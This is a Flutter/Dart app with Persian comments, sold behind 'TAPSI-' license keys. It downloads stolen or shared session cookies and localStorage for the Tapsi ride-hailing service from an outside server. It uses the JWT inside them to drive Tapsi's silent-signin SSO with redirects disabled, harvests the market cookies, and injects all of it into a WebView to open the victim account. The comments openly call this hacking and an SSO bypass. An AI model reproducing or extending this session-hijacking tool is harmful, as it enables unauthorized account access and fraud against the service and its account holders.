import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:dio/dio.dart'; // اضافه شدن ماژول شبکه برای دور زدن ریدایرکت
import 'dart:convert';
import 'dart:collection';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const PremiumClientApp());
}

class PremiumClientApp extends StatelessWidget {
  const PremiumClientApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Premium Access',
      theme: ThemeData.dark().copyWith(
        primaryColor: const Color(0xFF5CEBFF),
        scaffoldBackgroundColor: const Color(0xFF0B0C10),
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFF5CEBFF),
          secondary: Color(0xFFD4AF37),
        ),
      ),
      debugShowCheckedModeBanner: false,
      home: const AuthenticationScreen(),
    );
  }
}

// ==========================================
// SECURE AUTHENTICATION SCREEN
// ==========================================
class AuthenticationScreen extends StatefulWidget {
  const AuthenticationScreen({Key? key}) : super(key: key);

  @override
  State<AuthenticationScreen> createState() => _AuthenticationScreenState();
}

class _AuthenticationScreenState extends State<AuthenticationScreen> {
  final TextEditingController _licenseController = TextEditingController();
  bool _isLoading = false;
  String _errorMessage = '';

  Future<void> _verifyLicense() async {
    final licenseKey = _licenseController.text.trim();

    if (licenseKey.isEmpty || !licenseKey.startsWith('TAPSI-')) {
      setState(() => _errorMessage = 'INVALID LICENSE FORMAT');
      return;
    }

    setState(() {
      _isLoading = true;
      _errorMessage = '';
    });

    try {
      final response = await http.get(
        Uri.parse('https://testtok-production.up.railway.app/api/tapsi/get-license/$licenseKey'),
      );

      if (response.statusCode == 200) {
        final data = json.decode(response.body);

        if (data['success'] == true) {
          final cookies = data['data']['cookies'] ?? '';
          final localStorage = data['data']['local_storage'] ?? '{}';
          
          if (!mounted) return;
          Navigator.pushReplacement(
            context,
            PageRouteBuilder(
              pageBuilder: (context, animation, secondaryAnimation) => CoreEngineScreen(
                cookies: cookies,
                localStorageStr: localStorage,
              ),
              transitionsBuilder: (context, animation, secondaryAnimation, child) {
                return FadeTransition(opacity: animation, child: child);
              },
            ),
          );
        }
      } else {
        setState(() => _errorMessage = 'LICENSE EXPIRED OR UNAUTHORIZED');
      }
    } catch (e) {
      setState(() => _errorMessage = 'SECURE CONNECTION FAILED');
    } finally {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF1F2833), Color(0xFF0B0C10)],
          ),
        ),
        child: Center(
          child: SingleChildScrollView(
            padding: const EdgeInsets.symmetric(horizontal: 32.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Container(
                  padding: const EdgeInsets.all(24),
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: const Color(0xFF5CEBFF).withOpacity(0.05),
                    boxShadow: [
                      BoxShadow(
                        color: const Color(0xFF5CEBFF).withOpacity(0.15),
                        blurRadius: 40,
                        spreadRadius: 10,
                      )
                    ]
                  ),
                  child: const Icon(Icons.fingerprint_rounded, size: 80, color: Color(0xFF5CEBFF)),
                ),
                const SizedBox(height: 40),
                const Text(
                  'SYSTEM ACCESS',
                  style: TextStyle(
                    fontSize: 24,
                    fontWeight: FontWeight.w900,
                    letterSpacing: 6.0,
                    color: Colors.white,
                  ),
                ),
                const SizedBox(height: 12),
                const Text(
                  'Provide your secure token to proceed',
                  style: TextStyle(fontSize: 13, color: Colors.white54, letterSpacing: 1.2),
                ),
                const SizedBox(height: 45),
                TextField(
                  controller: _licenseController,
                  style: const TextStyle(color: Color(0xFF5CEBFF), letterSpacing: 2.5, fontWeight: FontWeight.bold, fontSize: 16),
                  decoration: InputDecoration(
                    filled: true,
                    fillColor: Colors.black.withOpacity(0.4),
                    hintText: 'TAPSI-XXXX-XXXX',
                    hintStyle: const TextStyle(color: Colors.white24, letterSpacing: 3.0),
                    contentPadding: const EdgeInsets.symmetric(vertical: 22),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(20),
                      borderSide: BorderSide(color: Colors.white.withOpacity(0.05), width: 1),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(20),
                      borderSide: const BorderSide(color: Color(0xFF5CEBFF), width: 1.5),
                    ),
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 20),
                if (_errorMessage.isNotEmpty)
                  Padding(
                    padding: const EdgeInsets.only(bottom: 20),
                    child: Text(_errorMessage, style: const TextStyle(color: Color(0xFFFF5252), fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1.0)),
                  ),
                SizedBox(
                  width: double.infinity,
                  height: 60,
                  child: ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFF5CEBFF),
                      foregroundColor: const Color(0xFF0B0C10),
                      elevation: 8,
                      shadowColor: const Color(0xFF5CEBFF).withOpacity(0.4),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
                    ),
                    onPressed: _isLoading ? null : _verifyLicense,
                    child: _isLoading 
                      ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: Color(0xFF0B0C10), strokeWidth: 3))
                      : const Text('AUTHENTICATE', style: TextStyle(fontSize: 16, fontWeight: FontWeight.w900, letterSpacing: 3.0)),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

// ==========================================
// CORE ENGINE SCREEN (WEBVIEW)
// ==========================================
class CoreEngineScreen extends StatefulWidget {
  final String cookies;
  final String localStorageStr;

  const CoreEngineScreen({
    Key? key,
    required this.cookies,
    required this.localStorageStr,
  }) : super(key: key);

  @override
  State<CoreEngineScreen> createState() => _CoreEngineScreenState();
}

class _CoreEngineScreenState extends State<CoreEngineScreen> {
  InAppWebViewController? webViewController;
  bool _isEngineReady = false;
  String _extractedJwt = '';

  @override
  void initState() {
    super.initState();
    _extractToken();
    _initializeEngine();
  }

  // استخراج توکن برای استفاده در عملیات SSO
  void _extractToken() {
    try {
      RegExp exp1 = RegExp(r'"accessToken"\s*:\s*"([^"]+)"');
      var match1 = exp1.firstMatch(widget.localStorageStr);
      if (match1 != null) {
        _extractedJwt = match1.group(1)!;
        return;
      }

      RegExp exp2 = RegExp(r'"token"\s*:\s*"([^"]+)"');
      var match2 = exp2.firstMatch(widget.localStorageStr);
      if (match2 != null) {
        _extractedJwt = match2.group(1)!;
        return;
      }
    } catch (e) {
      print("Token Extraction Failed: $e");
    }
  }

  // 🚀 تابع هکری: دور زدن ریدایرکت تپسی و استخراج کوکی‌های مارکت
  Future<void> _prepareMarketSSO(String jwtToken) async {
    try {
      final dio = Dio(BaseOptions(
        followRedirects: false, // جلوگیری از ریدایرکت خودکار
        validateStatus: (status) => true,
      ));

      final ssoUrl = "https://accounts.tapsi.ir/silent-signin?client_id=com.okala&scope=okala_access&redirect_uri=https%3A%2F%2Fwww.tapsi.markets&response_type=code&prompt=none";

      final ssoResponse = await dio.get(
        ssoUrl,
        options: Options(
          headers: {
            "Cookie": "accessToken=$jwtToken;",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
          },
        ),
      );

      if (ssoResponse.statusCode == 302 || ssoResponse.statusCode == 301) {
        final redirectUrl = ssoResponse.headers.value('location');
        if (redirectUrl != null && redirectUrl.contains('code=')) {
          final marketResponse = await dio.get(
            redirectUrl,
            options: Options(headers: {
              "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            }),
          );

          // استخراج کوکی‌های Set-Cookie که حاوی token و tokenMS هستند
          final rawCookies = marketResponse.headers.map['set-cookie'];
          if (rawCookies != null) {
            CookieManager cookieManager = CookieManager.instance();
            for (var cookieStr in rawCookies) {
              final parts = cookieStr.split(';');
              final nameValue = parts[0].split('=');
              if (nameValue.length >= 2) {
                final name = nameValue[0].trim();
                final value = nameValue.sublist(1).join('=').trim();

                // تزریق بی‌صدا به مرورگر
                await cookieManager.setCookie(
                  url: WebUri("https://www.tapsi.markets"),
                  name: name,
                  value: value,
                  domain: ".tapsi.markets",
                  isSecure: true,
                );
              }
            }
            print("✅ MARKET COOKIES INJECTED SUCCESSFULLY!");
          }
        }
      }
    } catch (e) {
      print("SSO Bypassing Failed: $e");
    }
  }

  Future<void> _initializeEngine() async {
    // 🚀 در حین اینکه کاربر صفحه لودینگ را می‌بیند، ما مارکت را هک می‌کنیم!
    if (_extractedJwt.isNotEmpty) {
      await _prepareMarketSSO(_extractedJwt);
    } else {
      await Future.delayed(const Duration(milliseconds: 1500));
    }

    if (mounted) {
      setState(() {
        _isEngineReady = true;
      });
    }
  }

  String _generateInjectionScript() {
    try {
      final Map<String, dynamic> localStorageMap = json.decode(widget.localStorageStr);
      String script = '';
      
      localStorageMap.forEach((key, value) {
        if (value is String) {
          String safeValue = value.replaceAll("'", "\\'").replaceAll('\n', '\\n');
          script += "window.localStorage.setItem('$key', '$safeValue');\n";
        } else {
          String safeValue = json.encode(value).replaceAll("'", "\\'").replaceAll('\n', '\\n');
          script += "window.localStorage.setItem('$key', '$safeValue');\n";
        }
      });
      return script;
    } catch (e) {
      return '';
    }
  }

  @override
  Widget build(BuildContext context) {
    if (!_isEngineReady) {
      return Scaffold(
        backgroundColor: const Color(0xFF0B0C10),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const SizedBox(
                width: 60,
                height: 60,
                child: CircularProgressIndicator(
                  color: Color(0xFF5CEBFF),
                  strokeWidth: 2,
                ),
              ),
              const SizedBox(height: 30),
              Text(
                'INITIALIZING CORE ENGINE...',
                style: TextStyle(
                  color: const Color(0xFF5CEBFF).withOpacity(0.7),
                  fontSize: 12,
                  letterSpacing: 3.0,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ],
          ),
        ),
      );
    }

    UserScript injectionScript = UserScript(
      source: _generateInjectionScript(),
      injectionTime: UserScriptInjectionTime.AT_DOCUMENT_START,
    );

    return WillPopScope(
      onWillPop: () async {
        if (webViewController != null && await webViewController!.canGoBack()) {
          webViewController!.goBack();
          return false;
        } else {
          if (context.mounted) Navigator.of(context).pop();
          return true;
        }
      },
      child: Scaffold(
        backgroundColor: const Color(0xFF0B0C10),
        body: SafeArea(
          child: InAppWebView(
            initialUrlRequest: URLRequest(url: WebUri("https://app.tapsi.cab/profile/")),
            initialUserScripts: UnmodifiableListView<UserScript>([injectionScript]),
            initialSettings: InAppWebViewSettings(
              javaScriptEnabled: true,
              domStorageEnabled: true,
              clearCache: false, // ⚠️ حتما باید False بماند تا کوکی‌های تزریق‌شده پاک نشوند
              thirdPartyCookiesEnabled: true, 
              supportMultipleWindows: false,
              javaScriptCanOpenWindowsAutomatically: false,
              userAgent: "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            ),
            onWebViewCreated: (controller) {
              webViewController = controller;
            },
            onLoadStop: (controller, url) async {
              // فقط اگر در صفحه اصلی تاکسی بود، کش سشن را رفرش کند تا لود شود
              if (url != null && url.toString().contains('app.tapsi.cab')) {
                bool? isReloaded = await controller.evaluateJavascript(source: "window.sessionStorage.getItem('core_init');") == 'true';
                if (!isReloaded) {
                  await controller.evaluateJavascript(source: "window.sessionStorage.setItem('core_init', 'true');");
                  controller.reload();
                }
              }
            },
          ),
        ),
      ),
    );
  }
}
